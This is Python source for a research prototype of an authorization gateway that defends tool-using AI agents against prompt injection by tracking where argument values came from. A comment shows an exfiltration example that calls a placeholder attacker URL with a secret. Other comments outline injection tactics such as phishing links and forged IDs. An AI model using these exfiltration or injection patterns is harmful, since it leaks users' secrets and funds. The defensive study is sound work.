"""Provenance-bound authorization gateway (POC).

Sits between an agent and its tools. It never inspects text for "maliciousness".
It only tracks *where values came from* and decides, per tool call, whether the
call's control arguments were supplied by a trusted principal (the user) or
could have been chosen by untrusted content (tool outputs written by third
parties).

Tool classification is auto-derived from tool names and argument names - no
per-tool manual policy - to test hypothesis H5 (policy can be derived from
schemas).
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field

import yaml

from graph import DESTINATION_ARGS

# A tool is a "sink" (an action with side effects) if its name starts with a verb
# that changes state or sends something out. Everything else is a read.
SINK_PREFIXES = (
    "send_", "share_", "post_", "delete_", "create_", "append_", "reserve_",
    "schedule_", "update_", "cancel_", "reschedule_", "add_", "invite_", "remove_",
    # Generic executors (e.g. `execute_sql`) can write anything, so they are sinks. No effect on
    # AgentDojo, which has no such tools.
    "execute_", "run_",
)

# Free-text arguments are data, not control. Every other argument of a sink is
# treated as control (who / where / which / how much).
CONTENT_ARGS = {"body", "subject", "content", "description", "title", "attachments"}

# Reads that return only the user's own account state (not writable by third
# parties). The only hand-written list in the policy.
TRUSTED_READS = {"get_current_day", "get_iban", "get_balance", "get_user_info", "get_user_information"}

# High-risk sinks move money, data or access outside the user's control.
HIGH_RISK_PREFIXES = ("send_", "share_", "post_", "invite_", "add_user", "update_password", "update_scheduled")

POLICIES = ("session", "argument-permissive", "argument-strict", "endorsed-permissive", "endorsed-strict", "tiered",
            "argument-strict+graph", "tiered+graph", "argument-strict+graph+links", "tiered+graph+links",
            # H9 ablations on top of strict+graph+links, then all three together
            "argument-strict+graph+links+dates", "argument-strict+graph+links+amounts",
            "argument-strict+graph+links+ids", "argument-strict+graph+links+h9", "tiered+graph+links+h9",
            # H10: execution dates of payments (found in the end-to-end pilot, see e2e.py)
            "argument-strict+graph+links+h9+timing", "tiered+graph+links+h9+timing")
BASE_POLICIES = ("session", "argument-permissive", "argument-strict", "endorsed-permissive", "endorsed-strict", "tiered")
FEATURES = {"graph", "links", "dates", "amounts", "ids", "flow", "timing"}

# When an action runs, not who it reaches or how much it moves. Only relaxed by "+timing".
TIMING_ARGS = {"date", "execution_date", "scheduled_date"}  # "h9" = dates + amounts + ids

# Links embedded in free text are destinations too (phishing link sent to a real colleague).
URL_RE = re.compile(r"(?:https?://)?(?:www\.)[a-z0-9.-]+\.[a-z]{2,}(?:/[^\s'\"]*)?|https?://[^\s'\"]+")


def is_high_risk(tool: str, args: dict | None = None) -> bool:
    return tool.startswith(HIGH_RISK_PREFIXES) or bool(args and EGRESS_ARGS & set(args))


# Any call that takes a URL is network egress, even if it is named like a read
# (e.g. get_webpage("https://attacker/?q=<secret>")).
EGRESS_ARGS = {"url"}


def is_sink(tool: str, args: dict | None = None) -> bool:
    return tool.startswith(SINK_PREFIXES) or bool(args and EGRESS_ARGS & set(args))


def _atoms(value) -> list[str]:
    """Flatten an argument value into comparable string atoms."""
    if value is None:
        return []
    if isinstance(value, (list, tuple, set)):
        return [a for v in value for a in _atoms(v)]
    if isinstance(value, dict):
        return [a for v in value.values() for a in _atoms(v)]
    s = str(value).strip()
    return [s.lower()] if s else []


def _contains(haystack: str, atom: str) -> bool:
    # Token-boundary match so that "13" does not match "2013".
    return re.search(r"(?<![a-z0-9])" + re.escape(atom) + r"(?![a-z0-9])", haystack) is not None


@dataclass
class Decision:
    allow: bool
    reason: str = ""


@dataclass
class ProvenanceGateway:
    policy: str = "argument-strict"
    user_text: str = ""  # user prompt + user's own account state
    trusted_text: str = ""  # outputs of endorsed reads
    untrusted_text: str = ""
    session_tainted: bool = False
    known: set = field(default_factory=set)  # known-counterparty graph (graph.py), used by "+graph" policies
    amount_cap: float | None = None  # largest past outgoing payment (graph.py), used by "+amounts"
    owned_ids: set = field(default_factory=set)  # object IDs seen in structured read results, "+ids"
    read_private: bool = False  # a read returned data labelled private by its connector, "+flow"
    log: list = field(default_factory=list)

    def __post_init__(self):
        self.policy, *feats = self.policy.split("+")
        assert self.policy in BASE_POLICIES, self.policy
        feats = set(feats) | ({"dates", "amounts", "ids"} if "h9" in feats else set())
        assert feats <= FEATURES | {"h9"}, feats
        self.use_graph, self.check_links = "graph" in feats, "links" in feats
        self.feats = feats

    # --- observation -----------------------------------------------------
    def observe_user_prompt(self, prompt: str) -> None:
        self.user_text += "\n" + prompt.lower()

    def observe_tool_result(self, tool: str, output: str, args: dict | None = None, private: bool = False) -> None:
        self.read_private |= private
        if "ids" in self.feats:
            # reads of the user's stores, and objects created in this session (create_file -> id)
            self.owned_ids |= _structured_ids(output)
        if tool in TRUSTED_READS:
            self.user_text += "\n" + output.lower()
        elif self._endorsed(tool, args or {}):
            self.trusted_text += "\n" + output.lower()
            self.session_tainted = True  # endorsed != authored by the user
        else:
            self.untrusted_text += "\n" + output.lower()
            self.session_tainted = True

    def _endorsed(self, tool: str, args: dict) -> bool:
        """"endorsed-*" policies: a targeted read whose every argument was supplied by the
        user (e.g. read_file('bill-december-2023.txt') when the user named that file)
        returns content the user explicitly delegated to, so its output is trusted."""
        if not self.policy.startswith(("endorsed", "tiered")) or is_sink(tool, args) or not args:
            return False
        atoms = [a for v in args.values() for a in _atoms(v)]
        return bool(atoms) and all(self.provenance(a) == "trusted" for a in atoms)

    # --- enforcement -----------------------------------------------------
    def provenance(self, atom: str, include_endorsed: bool = True) -> str:
        if _contains(self.user_text, atom) or (include_endorsed and _contains(self.trusted_text, atom)):
            return "trusted"
        if _contains(self.untrusted_text, atom):
            return "untrusted"
        return "unknown"  # produced by the model itself (computed, paraphrased, decoded...)

    def check(self, tool: str, args: dict, external: bool = False) -> Decision:
        d = self._check(tool, args, external)
        self.log.append((tool, args, d))
        return d

    def _check(self, tool: str, args: dict, external: bool = False) -> Decision:
        if not is_sink(tool, args):
            return Decision(True)
        if "flow" in self.feats and external and self.read_private and self.session_tainted:
            # Rule of Two, per sink: private data + untrusted content + a destination outside the
            # trust boundary (labelled by the connector: public repo, customer-visible thread, URL).
            return Decision(False, "flow: private data and untrusted content -> external sink")
        if self.policy == "session":
            # Coarse Rule-of-Two: once anything untrusted entered the context, no side effects.
            return Decision(not self.session_tainted, "session tainted" if self.session_tainted else "")
        high = is_high_risk(tool, args)
        # tiered: high-risk sinks accept only values the user authored; low-risk ones
        # also accept values from endorsed sources and model-computed values.
        include_endorsed = not (self.policy == "tiered" and high)
        strict = self.policy.endswith("strict") or (self.policy == "tiered" and high)
        for name, value in args.items():
            if name in CONTENT_ARGS:
                if self.check_links:
                    for url in URL_RE.findall(" ".join(_atoms(value))):
                        p = self.provenance(url.rstrip(".,)"), include_endorsed)
                        if p == "untrusted" or (p == "unknown" and strict and self.session_tainted):
                            return Decision(False, f"link in {name}: {url!r} is {p}")
                continue
            for atom in _atoms(value):
                if self.use_graph and name in DESTINATION_ARGS and atom in self.known:
                    continue  # an established counterparty, whoever suggested it
                if self._h9_allows(tool, name, atom):
                    continue
                p = self.provenance(atom, include_endorsed)
                if p == "untrusted" or (p == "unknown" and strict and self.session_tainted):
                    return Decision(False, f"{name}={atom!r} is {p}")
        return Decision(True)

    # --- H9: values that are *derived* from trusted state rather than copied from it ---
    def _h9_allows(self, tool: str, name: str, atom: str) -> bool:
        # H10: the execution date of a payment decides when money moves, not where or how much, and the
        # recipient and amount of the same call are still checked. A real agent picks it freely
        # ("today", the last transaction's date...), so matching it to text only produced friction.
        if "timing" in self.feats and name in TIMING_ARGS:
            return atom in ("today", "now") or bool(_DATE_ONLY_RE.fullmatch(atom))
        # dates/times the model re-assembled from what the user wrote ("12:00 on 2024-05-19")
        if "dates" in self.feats and _DATETIME_RE.fullmatch(atom):
            return _date_from_user(atom, name, self.user_text)
        # amounts the model computed: bounded by the account's own history, never a new maximum.
        # (The recipient is still checked on its own; this only lifts the "who chose the number" check.)
        if "amounts" in self.feats and name == "amount" and self.amount_cap is not None:
            try:
                return 0 < float(atom) <= self.amount_cap
            except ValueError:
                return False
        # object IDs that exist in the user's own stores (returned as structured `id` fields by a
        # read). Not for deletes: which object to destroy stays a user decision.
        if "ids" in self.feats and (name == "id" or name.endswith("_id")) and not tool.startswith("delete_"):
            return atom in self.owned_ids
        return False


def _structured_ids(output: str) -> set[str]:
    """IDs of objects returned by a read, taken from the parsed structure (not from free text,
    so an attacker cannot mint one by writing "id_: 13" in an e-mail body)."""
    try:
        data = yaml.safe_load(output)
    except yaml.YAMLError:
        return set()
    found: set[str] = set()

    def walk(x):
        if isinstance(x, dict):
            for k, v in x.items():
                if k in ("id", "id_") and isinstance(v, (str, int)):
                    found.add(str(v).lower())
                else:
                    walk(v)
        elif isinstance(x, list):
            for v in x:
                walk(v)
    walk(data)
    return found


_DATE_ONLY_RE = re.compile(r"\d{4}-\d{2}-\d{2}")
_DATETIME_RE = re.compile(r"(\d{4})-(\d{2})-(\d{2})(?: (\d{2}):(\d{2}))?")
_MONTHS = {m: i + 1 for i, m in enumerate(("january", "february", "march", "april", "may", "june", "july", "august",
                                           "september", "october", "november", "december"))}
_MONTHS |= {m[:3]: i for m, i in list(_MONTHS.items())}
_MON = "(" + "|".join(sorted(_MONTHS, key=len, reverse=True)) + r")\.?"
_DAY = r"(\d{1,2})(?:st|nd|rd|th)?"


def _user_dates_times(text: str):
    days = {(int(m), int(d)) for _, m, d in re.findall(r"(\d{4})-(\d{2})-(\d{2})", text)}
    days |= {(_MONTHS[m], int(d)) for m, d in re.findall(_MON + r"\s+" + _DAY + r"\b", text)}
    days |= {(_MONTHS[m], int(d)) for d, m in re.findall(r"\b" + _DAY + r"\s+(?:of\s+)?" + _MON, text)}
    times = {f"{int(h):02d}:{mm}" for h, mm in re.findall(r"\b(\d{1,2}):(\d{2})\b", text)}
    for h, ap in re.findall(r"\b(\d{1,2})\s*(am|pm|a\.m\.|p\.m\.)", text):
        times.add(f"{int(h) % 12 + (12 if ap.startswith('p') else 0):02d}:00")
    if "noon" in text:
        times.add("12:00")
    return days, times


def _date_from_user(atom: str, name: str, user_text: str) -> bool:
    """A date is user-derived if the user (or the user's own account state) named that month and day.
    The year may be inferred. A start time must also have been named; an end time may be computed
    (start + duration) as long as it falls on a user-named day; 00:00/23:59 mean "all day"."""
    y, mo, d, hh, mm = _DATETIME_RE.fullmatch(atom).groups()
    days, times = _user_dates_times(user_text)
    if (int(mo), int(d)) not in days:
        return False
    if hh is None or f"{hh}:{mm}" in times or f"{hh}:{mm}" in ("00:00", "23:59"):
        return True
    return name.startswith("end") or name.startswith("new_end")
